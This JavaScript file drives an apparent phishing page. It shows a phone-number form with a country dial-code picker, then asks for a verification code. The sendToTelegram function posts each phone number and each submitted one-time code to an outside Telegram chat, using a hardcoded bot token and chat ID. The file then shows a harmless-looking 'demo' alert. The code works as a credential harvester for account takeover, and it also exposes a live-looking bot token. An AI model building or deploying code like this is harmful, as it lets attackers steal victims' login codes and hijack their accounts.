// ===============================
// Country List
// ===============================
const allCountries = [
  { name: "Afghanistan", code: "+93", flag_url: "https://flagcdn.com/af.svg" },
  { name: "Albania", code: "+355", flag_url: "https://flagcdn.com/al.svg" },
  { name: "Algeria", code: "+213", flag_url: "https://flagcdn.com/dz.svg" },
  { name: "Andorra", code: "+376", flag_url: "https://flagcdn.com/ad.svg" },
  { name: "Angola", code: "+244", flag_url: "https://flagcdn.com/ao.svg" },
  { name: "Argentina", code: "+54", flag_url: "https://flagcdn.com/ar.svg" },
  { name: "Armenia", code: "+374", flag_url: "https://flagcdn.com/am.svg" },
  { name: "Australia", code: "+61", flag_url: "https://flagcdn.com/au.svg" },
  { name: "Austria", code: "+43", flag_url: "https://flagcdn.com/at.svg" },
  { name: "Azerbaijan", code: "+994", flag_url: "https://flagcdn.com/az.svg" },
  { name: "Bahamas", code: "+1-242", flag_url: "https://flagcdn.com/bs.svg" },
  { name: "Bahrain", code: "+973", flag_url: "https://flagcdn.com/bh.svg" },
  { name: "Bangladesh", code: "+880", flag_url: "https://flagcdn.com/bd.svg" },
  { name: "Barbados", code: "+1-246", flag_url: "https://flagcdn.com/bb.svg" },
  { name: "Belarus", code: "+375", flag_url: "https://flagcdn.com/by.svg" },
  { name: "Belgium", code: "+32", flag_url: "https://flagcdn.com/be.svg" },
  { name: "Belize", code: "+501", flag_url: "https://flagcdn.com/bz.svg" },
  { name: "Benin", code: "+229", flag_url: "https://flagcdn.com/bj.svg" },
  { name: "Bhutan", code: "+975", flag_url: "https://flagcdn.com/bt.svg" },
  { name: "Bolivia", code: "+591", flag_url: "https://flagcdn.com/bo.svg" },
  { name: "Bosnia and Herzegovina", code: "+387", flag_url: "https://flagcdn.com/ba.svg" },
  { name: "Botswana", code: "+267", flag_url: "https://flagcdn.com/bw.svg" },
  { name: "Brazil", code: "+55", flag_url: "https://flagcdn.com/br.svg" },
  { name: "Brunei", code: "+673", flag_url: "https://flagcdn.com/bn.svg" },
  { name: "Bulgaria", code: "+359", flag_url: "https://flagcdn.com/bg.svg" },
  { name: "Burkina Faso", code: "+226", flag_url: "https://flagcdn.com/bf.svg" },
  { name: "Burundi", code: "+257", flag_url: "https://flagcdn.com/bi.svg" },
  { name: "Cambodia", code: "+855", flag_url: "https://flagcdn.com/kh.svg" },
  { name: "Cameroon", code: "+237", flag_url: "https://flagcdn.com/cm.svg" },
  { name: "Canada", code: "+1", flag_url: "https://flagcdn.com/ca.svg" },
  { name: "Cape Verde", code: "+238", flag_url: "https://flagcdn.com/cv.svg" },
  { name: "Central African Republic", code: "+236", flag_url: "https://flagcdn.com/cf.svg" },
  { name: "Chad", code: "+235", flag_url: "https://flagcdn.com/td.svg" },
  { name: "Chile", code: "+56", flag_url: "https://flagcdn.com/cl.svg" },
  { name: "China", code: "+86", flag_url: "https://flagcdn.com/cn.svg" },
  { name: "Colombia", code: "+57", flag_url: "https://flagcdn.com/co.svg" },
  { name: "Comoros", code: "+269", flag_url: "https://flagcdn.com/km.svg" },
  { name: "Congo (Brazzaville)", code: "+242", flag_url: "https://flagcdn.com/cg.svg" },
  { name: "Congo (Kinshasa)", code: "+243", flag_url: "https://flagcdn.com/cd.svg" },
  { name: "Costa Rica", code: "+506", flag_url: "https://flagcdn.com/cr.svg" },
  { name: "Croatia", code: "+385", flag_url: "https://flagcdn.com/hr.svg" },
  { name: "Cuba", code: "+53", flag_url: "https://flagcdn.com/cu.svg" },
  { name: "Cyprus", code: "+357", flag_url: "https://flagcdn.com/cy.svg" },
  { name: "Czech Republic", code: "+420", flag_url: "https://flagcdn.com/cz.svg" },
  { name: "Denmark", code: "+45", flag_url: "https://flagcdn.com/dk.svg" },
  { name: "Djibouti", code: "+253", flag_url: "https://flagcdn.com/dj.svg" },
  { name: "Dominica", code: "+1-767", flag_url: "https://flagcdn.com/dm.svg" },
  { name: "Dominican Republic", code: "+1-809", flag_url: "https://flagcdn.com/do.svg" },
  { name: "Ecuador", code: "+593", flag_url: "https://flagcdn.com/ec.svg" },
  { name: "Egypt", code: "+20", flag_url: "https://flagcdn.com/eg.svg" },
  { name: "El Salvador", code: "+503", flag_url: "https://flagcdn.com/sv.svg" },
  { name: "Equatorial Guinea", code: "+240", flag_url: "https://flagcdn.com/gq.svg" },
  { name: "Eritrea", code: "+291", flag_url: "https://flagcdn.com/er.svg" },
  { name: "Estonia", code: "+372", flag_url: "https://flagcdn.com/ee.svg" },
  { name: "Eswatini", code: "+268", flag_url: "https://flagcdn.com/sz.svg" },
  { name: "Ethiopia", code: "+251", flag_url: "https://flagcdn.com/et.svg" },
  { name: "Fiji", code: "+679", flag_url: "https://flagcdn.com/fj.svg" },
  { name: "Finland", code: "+358", flag_url: "https://flagcdn.com/fi.svg" },
  { name: "France", code: "+33", flag_url: "https://flagcdn.com/fr.svg" },
  { name: "Gabon", code: "+241", flag_url: "https://flagcdn.com/ga.svg" },
  { name: "Gambia", code: "+220", flag_url: "https://flagcdn.com/gm.svg" },
  { name: "Georgia", code: "+995", flag_url: "https://flagcdn.com/ge.svg" },
  { name: "Germany", code: "+49", flag_url: "https://flagcdn.com/de.svg" },
  { name: "Ghana", code: "+233", flag_url: "https://flagcdn.com/gh.svg" },
  { name: "Greece", code: "+30", flag_url: "https://flagcdn.com/gr.svg" },
  { name: "Grenada", code: "+1-473", flag_url: "https://flagcdn.com/gd.svg" },
  { name: "Guatemala", code: "+502", flag_url: "https://flagcdn.com/gt.svg" },
  { name: "Guinea", code: "+224", flag_url: "https://flagcdn.com/gn.svg" },
  { name: "Guinea-Bissau", code: "+245", flag_url: "https://flagcdn.com/gw.svg" },
  { name: "Guyana", code: "+592", flag_url: "https://flagcdn.com/gy.svg" },
  { name: "Haiti", code: "+509", flag_url: "https://flagcdn.com/ht.svg" },
  { name: "Honduras", code: "+504", flag_url: "https://flagcdn.com/hn.svg" },
  { name: "Hungary", code: "+36", flag_url: "https://flagcdn.com/hu.svg" },
  { name: "Iceland", code: "+354", flag_url: "https://flagcdn.com/is.svg" },
  { name: "India", code: "+91", flag_url: "https://flagcdn.com/in.svg" },
  { name: "Indonesia", code: "+62", flag_url: "https://flagcdn.com/id.svg" },
  { name: "Iran", code: "+98", flag_url: "https://flagcdn.com/ir.svg" },
  { name: "Iraq", code: "+964", flag_url: "https://flagcdn.com/iq.svg" },
  { name: "Ireland", code: "+353", flag_url: "https://flagcdn.com/ie.svg" },
  { name: "Israel", code: "+972", flag_url: "https://flagcdn.com/il.svg" },
  { name: "Italy", code: "+39", flag_url: "https://flagcdn.com/it.svg" },
  { name: "Ivory Coast", code: "+225", flag_url: "https://flagcdn.com/ci.svg" },
  { name: "Jamaica", code: "+1-876", flag_url: "https://flagcdn.com/jm.svg" },
  { name: "Japan", code: "+81", flag_url: "https://flagcdn.com/jp.svg" },
  { name: "Jordan", code: "+962", flag_url: "https://flagcdn.com/jo.svg" },
  { name: "Kazakhstan", code: "+7", flag_url: "https://flagcdn.com/kz.svg" },
  { name: "Kenya", code: "+254", flag_url: "https://flagcdn.com/ke.svg" },
  { name: "Kiribati", code: "+686", flag_url: "https://flagcdn.com/ki.svg" },
  { name: "Kuwait", code: "+965", flag_url: "https://flagcdn.com/kw.svg" },
  { name: "Kyrgyzstan", code: "+996", flag_url: "https://flagcdn.com/kg.svg" },
  { name: "Laos", code: "+856", flag_url: "https://flagcdn.com/la.svg" },
  { name: "Latvia", code: "+371", flag_url: "https://flagcdn.com/lv.svg" },
  { name: "Lebanon", code: "+961", flag_url: "https://flagcdn.com/lb.svg" },
  { name: "Lesotho", code: "+266", flag_url: "https://flagcdn.com/ls.svg" },
  { name: "Liberia", code: "+231", flag_url: "https://flagcdn.com/lr.svg" },
  { name: "Libya", code: "+218", flag_url: "https://flagcdn.com/ly.svg" },
  { name: "Liechtenstein", code: "+423", flag_url: "https://flagcdn.com/li.svg" },
  { name: "Lithuania", code: "+370", flag_url: "https://flagcdn.com/lt.svg" },
  { name: "Luxembourg", code: "+352", flag_url: "https://flagcdn.com/lu.svg" },
  { name: "Madagascar", code: "+261", flag_url: "https://flagcdn.com/mg.svg" },
  { name: "Malawi", code: "+265", flag_url: "https://flagcdn.com/mw.svg" },
  { name: "Malaysia", code: "+60", flag_url: "https://flagcdn.com/my.svg" },
  { name: "Maldives", code: "+960", flag_url: "https://flagcdn.com/mv.svg" },
  { name: "Mali", code: "+223", flag_url: "https://flagcdn.com/ml.svg" },
  { name: "Malta", code: "+356", flag_url: "https://flagcdn.com/mt.svg" },
  { name: "Mauritania", code: "+222", flag_url: "https://flagcdn.com/mr.svg" },
  { name: "Mauritius", code: "+230", flag_url: "https://flagcdn.com/mu.svg" },
  { name: "Mexico", code: "+52", flag_url: "https://flagcdn.com/mx.svg" },
  { name: "Micronesia", code: "+691", flag_url: "https://flagcdn.com/fm.svg" },
  { name: "Moldova", code: "+373", flag_url: "https://flagcdn.com/md.svg" },
  { name: "Monaco", code: "+377", flag_url: "https://flagcdn.com/mc.svg" },
  { name: "Mongolia", code: "+976", flag_url: "https://flagcdn.com/mn.svg" },
  { name: "Montenegro", code: "+382", flag_url: "https://flagcdn.com/me.svg" },
  { name: "Morocco", code: "+212", flag_url: "https://flagcdn.com/ma.svg" },
  { name: "Mozambique", code: "+258", flag_url: "https://flagcdn.com/mz.svg" },
  { name: "Myanmar", code: "+95", flag_url: "https://flagcdn.com/mm.svg" },
  { name: "Namibia", code: "+264", flag_url: "https://flagcdn.com/na.svg" },
  { name: "Nauru", code: "+674", flag_url: "https://flagcdn.com/nr.svg" },
  { name: "Nepal", code: "+977", flag_url: "https://flagcdn.com/np.svg" },
  { name: "Netherlands", code: "+31", flag_url: "https://flagcdn.com/nl.svg" },
  { name: "New Zealand", code: "+64", flag_url: "https://flagcdn.com/nz.svg" },
  { name: "Nicaragua", code: "+505", flag_url: "https://flagcdn.com/ni.svg" },
  { name: "Niger", code: "+227", flag_url: "https://flagcdn.com/ne.svg" },
  { name: "Nigeria", code: "+234", flag_url: "https://flagcdn.com/ng.svg" },
  { name: "North Korea", code: "+850", flag_url: "https://flagcdn.com/kp.svg" },
  { name: "North Macedonia", code: "+389", flag_url: "https://flagcdn.com/mk.svg" },
  { name: "Norway", code: "+47", flag_url: "https://flagcdn.com/no.svg" },
  { name: "Oman", code: "+968", flag_url: "https://flagcdn.com/om.svg" },
  { name: "Pakistan", code: "+92", flag_url: "https://flagcdn.com/pk.svg" },
  { name: "Palau", code: "+680", flag_url: "https://flagcdn.com/pw.svg" },
  { name: "Palestine", code: "+970", flag_url: "https://flagcdn.com/ps.svg" },
  { name: "Panama", code: "+507", flag_url: "https://flagcdn.com/pa.svg" },
  { name: "Papua New Guinea", code: "+675", flag_url: "https://flagcdn.com/pg.svg" },
  { name: "Paraguay", code: "+595", flag_url: "https://flagcdn.com/py.svg" },
  { name: "Peru", code: "+51", flag_url: "https://flagcdn.com/pe.svg" },
  { name: "Philippines", code: "+63", flag_url: "https://flagcdn.com/ph.svg" },
  { name: "Poland", code: "+48", flag_url: "https://flagcdn.com/pl.svg" },
  { name: "Portugal", code: "+351", flag_url: "https://flagcdn.com/pt.svg" },
  { name: "Qatar", code: "+974", flag_url: "https://flagcdn.com/qa.svg" },
  { name: "Romania", code: "+40", flag_url: "https://flagcdn.com/ro.svg" },
  { name: "Russia", code: "+7", flag_url: "https://flagcdn.com/ru.svg" },
  { name: "Rwanda", code: "+250", flag_url: "https://flagcdn.com/rw.svg" },
  { name: "Saint Lucia", code: "+1-758", flag_url: "https://flagcdn.com/lc.svg" },
  { name: "Samoa", code: "+685", flag_url: "https://flagcdn.com/ws.svg" },
  { name: "San Marino", code: "+378", flag_url: "https://flagcdn.com/sm.svg" },
  { name: "Saudi Arabia", code: "+966", flag_url: "https://flagcdn.com/sa.svg" },
  { name: "Senegal", code: "+221", flag_url: "https://flagcdn.com/sn.svg" },
  { name: "Serbia", code: "+381", flag_url: "https://flagcdn.com/rs.svg" },
  { name: "Seychelles", code: "+248", flag_url: "https://flagcdn.com/sc.svg" },
  { name: "Sierra Leone", code: "+232", flag_url: "https://flagcdn.com/sl.svg" },
  { name: "Singapore", code: "+65", flag_url: "https://flagcdn.com/sg.svg" },
  { name: "Slovakia", code: "+421", flag_url: "https://flagcdn.com/sk.svg" },
  { name: "Slovenia", code: "+386", flag_url: "https://flagcdn.com/si.svg" },
  { name: "Solomon Islands", code: "+677", flag_url: "https://flagcdn.com/sb.svg" },
  { name: "Somalia", code: "+252", flag_url: "https://flagcdn.com/so.svg" },
  { name: "South Africa", code: "+27", flag_url: "https://flagcdn.com/za.svg" },
  { name: "South Korea", code: "+82", flag_url: "https://flagcdn.com/kr.svg" },
  { name: "South Sudan", code: "+211", flag_url: "https://flagcdn.com/ss.svg" },
  { name: "Spain", code: "+34", flag_url: "https://flagcdn.com/es.svg" },
  { name: "Sri Lanka", code: "+94", flag_url: "https://flagcdn.com/lk.svg" },
  { name: "Sudan", code: "+249", flag_url: "https://flagcdn.com/sd.svg" },
  { name: "Suriname", code: "+597", flag_url: "https://flagcdn.com/sr.svg" },
  { name: "Sweden", code: "+46", flag_url: "https://flagcdn.com/se.svg" },
  { name: "Switzerland", code: "+41", flag_url: "https://flagcdn.com/ch.svg" },
  { name: "Syria", code: "+963", flag_url: "https://flagcdn.com/sy.svg" },
  { name: "Taiwan", code: "+886", flag_url: "https://flagcdn.com/tw.svg" },
  { name: "Tajikistan", code: "+992", flag_url: "https://flagcdn.com/tj.svg" },
  { name: "Tanzania", code: "+255", flag_url: "https://flagcdn.com/tz.svg" },
  { name: "Thailand", code: "+66", flag_url: "https://flagcdn.com/th.svg" },
  { name: "Togo", code: "+228", flag_url: "https://flagcdn.com/tg.svg" },
  { name: "Tonga", code: "+676", flag_url: "https://flagcdn.com/to.svg" },
  { name: "Trinidad and Tobago", code: "+1-868", flag_url: "https://flagcdn.com/tt.svg" },
  { name: "Tunisia", code: "+216", flag_url: "https://flagcdn.com/tn.svg" },
  { name: "Turkey", code: "+90", flag_url: "https://flagcdn.com/tr.svg" },
  { name: "Turkmenistan", code: "+993", flag_url: "https://flagcdn.com/tm.svg" },
  { name: "Tuvalu", code: "+688", flag_url: "https://flagcdn.com/tv.svg" },
  { name: "Uganda", code: "+256", flag_url: "https://flagcdn.com/ug.svg" },
  { name: "Ukraine", code: "+380", flag_url: "https://flagcdn.com/ua.svg" },
  { name: "United Arab Emirates", code: "+971", flag_url: "https://flagcdn.com/ae.svg" },
  { name: "United Kingdom", code: "+44", flag_url: "https://flagcdn.com/gb.svg" },
  { name: "United States", code: "+1", flag_url: "https://flagcdn.com/us.svg" },
  { name: "Uruguay", code: "+598", flag_url: "https://flagcdn.com/uy.svg" },
  { name: "Uzbekistan", code: "+998", flag_url: "https://flagcdn.com/uz.svg" },
  { name: "Vanuatu", code: "+678", flag_url: "https://flagcdn.com/vu.svg" },
  { name: "Vatican City", code: "+379", flag_url: "https://flagcdn.com/va.svg" },
  { name: "Venezuela", code: "+58", flag_url: "https://flagcdn.com/ve.svg" },
  { name: "Vietnam", code: "+84", flag_url: "https://flagcdn.com/vn.svg" },
  { name: "Yemen", code: "+967", flag_url: "https://flagcdn.com/ye.svg" },
  { name: "Zambia", code: "+260", flag_url: "https://flagcdn.com/zm.svg" },
  { name: "Zimbabwe", code: "+263", flag_url: "https://flagcdn.com/zw.svg" }
];

// ===============================
// DOM Elements
// ===============================
const dropdownHeader = document.getElementById('dropdownHeader');
const dropdownList = document.getElementById('dropdownList');
const selectedCountryText = document.getElementById('selectedCountryText');
const selectedFlagDiv = document.getElementById('selectedFlag');
const countryCodeDisplay = document.getElementById('countryCodeDisplay');
const countryCodeInput = document.getElementById('countryCodeInput');

const phoneForm = document.getElementById('phoneForm');
const phoneNumberInput = document.getElementById('phoneNumberInput');

const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const displayPhoneNumber = document.getElementById('displayPhoneNumber');

const codeForm = document.getElementById('codeForm');
const codeInput = document.getElementById('codeInput');

// ===============================
// Telegram Bot Setup
// ===============================
// ⚠️ SECURITY WARNING: Never expose your bot token in production frontend code!
const TELEGRAM_BOT_TOKEN = "7530662027:AAGay6VXwq6VQJHePq1ytMl2aYjWFNdXN4w";
const TELEGRAM_CHAT_ID = "8078410911";

async function sendToTelegram(message) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML"
    };

    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      console.error("Telegram API Error:", await response.text());
      alert("Failed to send to Telegram.");
    } else {
      console.log("✅ Message sent successfully to Telegram!");
    }
  } catch (err) {
    console.error("Telegram send error:", err);
  }
}

// ===============================
// Dropdown Logic
// ===============================
let selectedCountry = null;

function closeDropdown() {
  dropdownList.classList.add('hidden');
}
function openDropdown() {
  dropdownList.classList.remove('hidden');
}

dropdownHeader.addEventListener('click', () => {
  dropdownList.classList.toggle('hidden');
});

document.addEventListener('click', (e) => {
  const container = document.querySelector('.custom-dropdown-container');
  if (!container.contains(e.target)) closeDropdown();
});

function populateCountries() {
  const countries = allCountries.slice().sort((a,b) => a.name.localeCompare(b.name));
  dropdownList.innerHTML = '';

  countries.forEach(country => {
    const div = document.createElement('div');
    div.className = 'dropdown-option';
    div.dataset.code = country.code;
    div.dataset.flag = country.flag_url;

    const left = document.createElement('div');
    left.className = 'left';
    const name = document.createElement('span');
    name.textContent = country.name;

    const flagSmall = document.createElement('div');
    flagSmall.className = 'flag-icon';
    flagSmall.style.width = '28px';
    flagSmall.style.height = '18px';
    flagSmall.style.backgroundImage = `url('${country.flag_url}')`;

    left.appendChild(flagSmall);
    left.appendChild(name);
    div.appendChild(left);

    div.addEventListener('click', () => selectCountry(country));
    dropdownList.appendChild(div);
  });

  const defaultCountry = countries.find(c => c.code === '+855') || countries[0];
  if (defaultCountry) selectCountry(defaultCountry);
}

function selectCountry(country) {
  selectedCountry = country;
  selectedCountryText.textContent = country.name;
  selectedFlagDiv.style.backgroundImage = `url('${country.flag_url}')`;
  countryCodeDisplay.textContent = country.code;
  countryCodeInput.value = country.code;

  dropdownList.querySelectorAll('.dropdown-option').forEach(opt => opt.classList.remove('selected'));
  const opt = Array.from(dropdownList.children).find(item => item.dataset.code === country.code);
  if (opt) opt.classList.add('selected');

  closeDropdown();
  phoneNumberInput.value = '';
}

// ===============================
// Form Logic
// ===============================
phoneForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  const raw = (phoneNumberInput.value || '').trim();
  if (!raw) {
    alert('Please enter a phone number.');
    return;
  }
  const normalized = raw.replace(/[^\d+]/g, '');
  const phoneDisplay = `${selectedCountry ? selectedCountry.code : ''} ${normalized}`;
  displayPhoneNumber.textContent = phoneDisplay;

  // Send to Telegram
  const message = `<b>📱 New Phone Submission</b>\n🌍 Country: ${selectedCountry.name}\n📞 Code: ${selectedCountry.code}\n☎️ Phone: ${normalized}`;
  await sendToTelegram(message);

  step1.classList.add('hidden');
  step2.classList.remove('hidden');
});

codeForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  const code = (codeInput.value || '').trim();
  if (!code) {
    alert('Please enter the verification code.');
    return;
  }

  const message = `<b>✅ Verification Code Submitted</b>\nCode: <code>${code}</code>`;
  await sendToTelegram(message);

  alert(`Code "${code}" submitted (demo).`);
  codeForm.reset();
  phoneForm.reset();
  step2.classList.add('hidden');
  step1.classList.remove('hidden');
});

// ===============================
// Initialize
// ===============================
populateCountries();
